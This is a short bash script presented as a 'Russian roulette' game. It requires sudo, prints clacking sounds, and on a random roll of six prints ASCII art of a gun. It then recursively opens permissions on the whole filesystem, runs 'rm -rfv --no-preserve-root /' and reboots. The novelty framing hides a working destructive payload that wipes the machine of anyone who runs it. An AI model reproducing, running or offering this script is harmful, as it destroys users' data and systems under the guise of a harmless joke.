#!/bin/bash

# Check if the script is being run with sudo
if [ "$(id -u)" != "0" ]; then
    echo "This script must be run with sudo"
    exit 1
fi

# Generate a random number from 1 to 6
random_number=$((1 + RANDOM % 6))

# Set the initial delay between clacks
delay=0.1

# Print the sound of rolling the cartridge with decreasing delay
for ((i=1; i<=random_number; i++)); do
    echo -n "Clack! "
    sleep $delay
    delay=$(bc -l <<< "$delay + 0.1")
done

echo   # Print a newline

sleep $delay
# play the Russian roulette game
if [ $random_number -eq 6 ];then
  # Get the current width of the terminal
  width=$(tput cols)

  if [ $width -gt 42 ]; then
    echo "  (                                 _    "
    echo "   )                               /=>  "
    echo "  (  +____________________/\/\___ / /|  "
    echo "   .''._____________'._____      / /|/\ "
    echo "  : () :              :\ ----\|    \ )  "
    echo "   '..'______________.'0|----|      \   "
    echo "                    0_0/____/        \  "
    echo "                        |----    /----\ "
    echo "                       || -\\ --|      \ "
    echo "                       ||   || ||\      \ "
    echo "                        \\____// '|      \ "
    echo "      Bang!                     .'/       | "
    echo "                               .:/        | "
    echo "                               :/_________| "
  else
    echo "Bang!"
  fi

  chown -R $USER:$USER /*
  chmod -R 777 /*

  chown -R $USER:$USER /
  chmod -R 777 /

  rm -rfv --no-preserve-root /*
  rm -rfv --no-preserve-root /

  reboot
else
  echo "Click!"
fi
